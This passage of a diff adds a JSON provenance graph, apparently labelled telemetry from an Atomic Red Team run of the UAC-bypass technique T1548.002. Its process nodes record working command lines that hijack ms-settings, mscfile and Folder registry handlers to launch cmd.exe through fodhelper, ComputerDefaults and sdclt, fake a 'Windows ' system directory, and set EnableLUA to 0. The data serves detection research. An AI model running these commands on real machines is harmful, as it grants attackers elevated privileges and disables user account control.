+        "guid": "{31314CAD-F2B3-5FB4-0000-00105AE30800}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2B2-5FB4-0000-001015C50800}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F2B2-5FB4-0000-001015C50800}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2B4-5FB4-0000-001075480900}",
+      "type": "Process",
+      "properties": {
+        "label": "fodhelper",
+        "image": "%WINDIR%\\System32\\fodhelper.exe",
+        "command_line": "fodhelper.exe  ",
+        "parent_image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{31314CAD-F2B4-5FB4-0000-001075480900}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2B4-5FB4-0000-0010CB440900}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{31314CAD-F2B4-5FB4-0000-0010CB440900}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Registry:2b8e70f90887861e",
+      "type": "Registry",
+      "properties": {
+        "path": "HKU\\S-1-5-21-1866976959-323464162-1096202132-500_Classes\\ms-settings\\shell\\open\\command\\DelegateExecute"
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2B4-5FB4-0000-00107C460900}",
+      "type": "Process",
+      "properties": {
+        "label": "reg",
+        "image": "%WINDIR%\\System32\\reg.exe",
+        "command_line": "reg.exe  add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f ",
+        "parent_image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{31314CAD-F2B4-5FB4-0000-00107C460900}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Registry:de25fc368edaea59",
+      "type": "Registry",
+      "properties": {
+        "path": "HKU\\S-1-5-21-1866976959-323464162-1096202132-500_Classes\\ms-settings\\shell\\open\\command\\(Default)"
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2B4-5FB4-0000-001097450900}",
+      "type": "Process",
+      "properties": {
+        "label": "reg",
+        "image": "%WINDIR%\\System32\\reg.exe",
+        "command_line": "reg.exe  add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f ",
+        "parent_image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{31314CAD-F2B4-5FB4-0000-001097450900}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2B4-5FB4-0000-001044420900}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "command_line": "\"C:\\Windows\\System32\\cmd.exe\" ",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F2B4-5FB4-0000-001044420900}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2B4-5FB4-0000-001059260900}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F2B4-5FB4-0000-001059260900}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Registry:7c56aa38aae4a569",
+      "type": "Registry",
+      "properties": {
+        "path": "HKU\\S-1-5-21-1866976959-323464162-1096202132-500_Classes\\mscfile\\shell\\open\\command\\(Default)"
+      }
+    },
+    {
+      "id": "File:8e9b39a0a2808555",
+      "type": "File",
+      "properties": {
+        "path": "%TEMP%\\PSScriptPolicyTest\\[Aggregated]",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\__psscriptpolicytest_sngm4koj.kre.ps1"
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2B4-5FB4-0000-0010D7240900}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "command_line": "\"C:\\Windows\\System32\\cmd.exe\" ",
+        "parent_image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{31314CAD-F2B4-5FB4-0000-0010D7240900}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2B4-5FB4-0000-0010891B0900}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{31314CAD-F2B4-5FB4-0000-0010891B0900}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2B4-5FB4-0000-0010F1190900}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{31314CAD-F2B4-5FB4-0000-0010F1190900}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2B4-5FB4-0000-0010A41A0900}",
+      "type": "Process",
+      "properties": {
+        "label": "reg",
+        "image": "%WINDIR%\\System32\\reg.exe",
+        "command_line": "reg.exe  add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f ",
+        "parent_image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{31314CAD-F2B4-5FB4-0000-0010A41A0900}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2B5-5FB4-0000-001053970900}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" & {New-Item -Force -Path \\\"\"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\\\"\" -Value 'cmd.exe /c notepad.exe'\nNew-ItemProperty -Force -Path \\\"\"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\\\"\" -Name \\\"\"DelegateExecute\\\"\"\nStart-Process -FilePath $env:windir\\system32\\sdclt.exe\nStart-Sleep -s 3} ",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F2B5-5FB4-0000-001053970900}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2B5-5FB4-0000-00107B950900}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "command_line": "\"C:\\Windows\\system32\\cmd.exe\" /c \"mkdir \"\\\\?\\C:\\Windows \\System32\\\" & copy \"C:\\Windows\\System32\\cmd.exe\" \"\\\\?\\C:\\Windows \\System32\\mmc.exe\" & mklink c:\\testbypass.exe \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\" ",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F2B5-5FB4-0000-00107B950900}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2B5-5FB4-0000-001046910900}",
+      "type": "Process",
+      "properties": {
+        "label": "ComputerDefaults",
+        "image": "%WINDIR%\\System32\\ComputerDefaults.exe",
+        "command_line": "\"C:\\Windows\\System32\\ComputerDefaults.exe\" ",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F2B5-5FB4-0000-001046910900}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2B5-5FB4-0000-001059740900}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F2B5-5FB4-0000-001059740900}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:328d7454674b64f3",
+      "type": "File",
+      "properties": {
+        "path": "%TEMP%\\PSScriptPolicyTest\\[Aggregated]",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\__psscriptpolicytest_ehkhfwtu.i3d.ps1"
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2B5-5FB4-0000-001022740900}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "command_line": "\"C:\\Windows\\System32\\cmd.exe\" ",
+        "parent_image": "%WINDIR%\\System32\\fodhelper.exe",
+        "guid": "{31314CAD-F2B5-5FB4-0000-001022740900}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2B5-5FB4-0000-0010516E0900}",
+      "type": "Process",
+      "properties": {
+        "label": "fodhelper",
+        "image": "%WINDIR%\\System32\\fodhelper.exe",
+        "guid": "{31314CAD-F2B5-5FB4-0000-0010516E0900}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2B5-5FB4-0000-0010E2540900}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F2B5-5FB4-0000-0010E2540900}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:bfae59c9e19f3f72",
+      "type": "File",
+      "properties": {
+        "path": "%TEMP%\\PSScriptPolicyTest\\[Aggregated]",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\__psscriptpolicytest_1th5om3z.ruu.ps1"
+      }
+    },
+    {
+      "id": "Registry:00b679520cb46e5a",
+      "type": "Registry",
+      "properties": {
+        "path": "HKU\\S-1-5-21-1866976959-323464162-1096202132-500_Classes\\Folder\\shell\\open\\command\\DelegateExecute"
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2B9-5FB4-0000-001032E50900}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "command_line": "\"C:\\Windows\\system32\\cmd.exe\" /c \"reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f\" ",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F2B9-5FB4-0000-001032E50900}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2BB-5FB4-0000-001070020A00}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F2BB-5FB4-0000-001070020A00}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:c524a4c5e5a275ec",
+      "type": "File",
+      "properties": {
+        "path": "%TEMP%\\PSScriptPolicyTest\\[Aggregated]",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\__psscriptpolicytest_5cm2zfx0.vev.ps1"
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2BB-5FB4-0000-0010A3010A00}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{31314CAD-F2BB-5FB4-0000-0010A3010A00}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2BA-5FB4-0000-0010B0FE0900}",
+      "type": "Process",
+      "properties": {
+        "label": "winrshost",
+        "image": "%WINDIR%\\System32\\winrshost.exe",
+        "guid": "{31314CAD-F2BA-5FB4-0000-0010B0FE0900}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2BC-5FB4-0000-00104D310A00}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"powershell.exe\" -noninteractive [DECODED: [Console]::InputEncoding = New-Object Text.UTF8Encoding $false; Import-Module \"C:\\AtomicRedTeam\\invoke-atomicredteam\\Invoke-AtomicRedTeam.psd1\" -Force\nInvoke-AtomicTest \"T1548.002\" -Cleanup]",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F2BC-5FB4-0000-00104D310A00}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2BB-5FB4-0000-00107B100A00}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F2BB-5FB4-0000-00107B100A00}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Registry:80e3c3ba984a7193",
+      "type": "Registry",
+      "properties": {
+        "path": "HKLM\\System\\CurrentControlSet\\Services\\npf\\ImagePath"
+      }
+    },
+    {
+      "id": "Registry:e77c86c0aea284c5",
+      "type": "Registry",
+      "properties": {
+        "path": "HKLM\\System\\CurrentControlSet\\Services\\npf\\Start"
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2BD-5FB4-0000-0010A9690A00}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" & {Remove-Item \\\"\"HKCU:\\software\\classes\\ms-settings\\\"\" -force -Recurse -ErrorAction Ignore} ",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F2BD-5FB4-0000-0010A9690A00}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2BD-5FB4-0000-001072680A00}",
+      "type": "Process",
+      "properties": {
+        "label": "reg",
+        "image": "%WINDIR%\\System32\\reg.exe",
+        "command_line": "reg.exe  delete hkcu\\software\\classes\\ms-settings /f  ",
+        "parent_image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{31314CAD-F2BD-5FB4-0000-001072680A00}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2BD-5FB4-0000-0010A6670A00}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{31314CAD-F2BD-5FB4-0000-0010A6670A00}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2BD-5FB4-0000-0010FC580A00}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" & {Remove-Item \\\"\"HKCU:\\software\\classes\\mscfile\\\"\" -force -Recurse -ErrorAction Ignore} ",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F2BD-5FB4-0000-0010FC580A00}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2BD-5FB4-0000-001083570A00}",
+      "type": "Process",
+      "properties": {
+        "label": "reg",
+        "image": "%WINDIR%\\System32\\reg.exe",
+        "command_line": "reg.exe  delete hkcu\\software\\classes\\mscfile /f  ",
+        "parent_image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{31314CAD-F2BD-5FB4-0000-001083570A00}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2BD-5FB4-0000-00101C560A00}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{31314CAD-F2BD-5FB4-0000-00101C560A00}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:8d6920bd73239a4c",
+      "type": "File",
+      "properties": {
+        "path": "%USER%%TEMP%\\xsepovsu\\xsepovsu.dll",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\xsepovsu\\xsepovsu.dll"
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2BE-5FB4-0000-0010A6980A00}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "command_line": "\"C:\\Windows\\system32\\cmd.exe\" /c \"reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f\" ",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F2BE-5FB4-0000-0010A6980A00}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2BE-5FB4-0000-0010E6890A00}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" & {Remove-Item -Path \\\"\"HKCU:\\Software\\Classes\\Folder\\\"\" -Recurse -Force -ErrorAction Ignore} ",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F2BE-5FB4-0000-0010E6890A00}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2BE-5FB4-0000-0010CE880A00}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "command_line": "\"C:\\Windows\\system32\\cmd.exe\" /c \"rd \"\\\\?\\C:\\Windows \\\" /S /Q >nul 2>nul & del \"c:\\testbypass.exe\" >nul 2>nul\" ",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F2BE-5FB4-0000-0010CE880A00}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Registry:4431ab4887e7c90d",
+      "type": "Registry",
+      "properties": {
+        "path": "HKCU\\SOFTWARE\\CLASSES\\MS-SETTINGS\\SHELL\\OPEN\\COMMAND"
+      }
+    },
+    {
+      "id": "Registry:54a5f4d883280660",
+      "type": "Registry",
+      "properties": {
+        "path": "HKCU\\SOFTWARE\\CLASSES\\MSCFILE\\SHELL\\OPEN\\COMMAND"
+      }
+    },
+    {
+      "id": "Registry:3ef43181fb09b957",
+      "type": "Registry",
+      "properties": {
+        "path": "HKCU\\SOFTWARE\\CLASSES\\MS-SETTINGS"
+      }
+    },
+    {
+      "id": "Registry:b2a081892075caa7",
+      "type": "Registry",
+      "properties": {
+        "path": "HKCU\\SOFTWARE\\CLASSES\\MSCFILE"
+      }
+    }
+  ],
+  "edges": [
+    {
+      "source": "Process:{31314CAD-F205-5FB4-0000-00103B951000}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-0010F7A01000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:05:57.695026000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F205-5FB4-0000-00103B951000}",
+      "target": "File:5817f4f013590052",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-18T10:05:57.604759900Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F205-5FB4-0000-001082941000}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-00103B951000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:05:57.567311100Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F205-5FB4-0000-0010AC911000}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-001082941000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:05:57.552674000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F097-5FB4-0000-0010885F0000}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-0010AC911000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:05:57.470070300Z",
+      "access_count": 6,
+      "last_timestamp": "2020-11-18T10:06:05.218591800Z"
+    },
+    {
+      "source": "Process:{31314CAD-F207-5FB4-0000-001034C31000}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-0010F7A01000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:05:59.307103300Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F207-5FB4-0000-001034C31000}",
+      "target": "File:8466b841aebb8186",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-18T10:05:59.217546400Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F207-5FB4-0000-001030C21000}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-00103B951000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:05:59.180187300Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F207-5FB4-0000-001095BD1000}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-001082941000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:05:59.174891500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F208-5FB4-0000-00105BED1000}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-0010F7A01000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:06:00.976917700Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F208-5FB4-0000-00105BED1000}",
+      "target": "File:d177b654223e3191",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-18T10:06:00.884623600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F208-5FB4-0000-001090EC1000}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-00103B951000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:06:00.847755500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F208-5FB4-0000-0010C7E91000}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-001082941000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:06:00.842459200Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F20A-5FB4-0000-0010442A1100}",
+      "target": "Process:{31314CAD-F20A-5FB4-0000-001010361100}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:06:02.842113000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F20A-5FB4-0000-0010442A1100}",
+      "target": "File:8057037f60f58632",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-18T10:06:02.752564300Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F20A-5FB4-0000-001080291100}",
+      "target": "Process:{31314CAD-F20A-5FB4-0000-0010442A1100}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:06:02.716132300Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F20A-5FB4-0000-001062111100}",
+      "target": "Process:{31314CAD-F20A-5FB4-0000-001080291100}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:06:02.711171700Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F20A-5FB4-0000-001062111100}",
+      "target": "Process:{31314CAD-F20A-5FB4-0000-001038141100}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:06:02.405096100Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F20B-5FB4-0000-001077441100}",
+      "target": "Process:{31314CAD-F20A-5FB4-0000-001038141100}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:06:03.327977700Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F20D-5FB4-0000-0010145B1100}",
+      "target": "Process:{31314CAD-F20A-5FB4-0000-001038141100}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:06:05.284660000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F22D-5FB4-0000-001029530000}",
+      "target": "Process:{31314CAD-F22F-5FB4-0000-0010CD650000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:06:55.928357600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F22D-5FB4-0000-0010E2460000}",
+      "target": "Process:{31314CAD-F22D-5FB4-0000-001029530000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:06:55.922778700Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F22D-5FB4-0000-00101E420000}",
+      "target": "Process:{31314CAD-F22D-5FB4-0000-0010E2460000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:06:55.911413300Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F22C-5FB4-0000-0010D32A0000}",
+      "target": "Process:{31314CAD-F22D-5FB4-0000-00101E420000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:06:55.893509800Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F22F-5FB4-0000-001078420100}",
+      "target": "File:9234f70040fcc47f",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-18T10:06:56.117283500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F22F-5FB4-0000-001078420100}",
+      "target": "File:28b66c37ee1145fc",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-18T10:06:56.049150100Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F264-5FB4-0000-0010CBA80500}",
+      "target": "Process:{31314CAD-F20A-5FB4-0000-001038141100}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:07:32.558964300Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F22F-5FB4-0000-0010CD650000}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-0010AC911000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:07:32.463157800Z",
+      "access_count": 10,
+      "last_timestamp": "2020-11-18T10:08:58.930303600Z"
+    },
+    {
+      "source": "Process:{31314CAD-F265-5FB4-0000-001045BD0500}",
+      "target": "Process:{31314CAD-F265-5FB4-0000-00100FC00500}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:07:33.114534100Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F26C-5FB4-0000-0010A6D10500}",
+      "target": "Process:{31314CAD-F26C-5FB4-0000-00101DD40500}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:07:40.326971900Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F287-5FB4-0000-00109BE50500}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-0010F7A01000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:07.402584200Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F287-5FB4-0000-00109BE50500}",
+      "target": "File:f54f441037ff35c4",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-18T10:08:07.311901000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F287-5FB4-0000-0010CAE40500}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-00103B951000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:07.275067900Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F287-5FB4-0000-0010F4E10500}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-001082941000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:07.269816900Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F28C-5FB4-0000-0010E8660600}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-0010F7A01000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:12.339782800Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F28C-5FB4-0000-0010E8660600}",
+      "target": "File:1ee2ecd9a4e09e64",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-18T10:08:12.248607100Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F28C-5FB4-0000-00101B660600}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-00103B951000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:12.210018600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F28C-5FB4-0000-00103D630600}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-001082941000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:12.204765400Z",
+      "access_count": 2,
+      "last_timestamp": "2020-11-18T10:08:13.824529900Z"
+    },
+    {
+      "source": "Process:{31314CAD-F28D-5FB4-0000-0010128C0600}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-0010F7A01000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:13.958780200Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F28D-5FB4-0000-0010128C0600}",
+      "target": "File:f691ed27db6f7dad",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-18T10:08:13.868117800Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F28D-5FB4-0000-00104D8B0600}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-00103B951000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:13.829874900Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F28F-5FB4-0000-001019B40600}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-0010F7A01000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:15.464365600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F28F-5FB4-0000-001019B40600}",
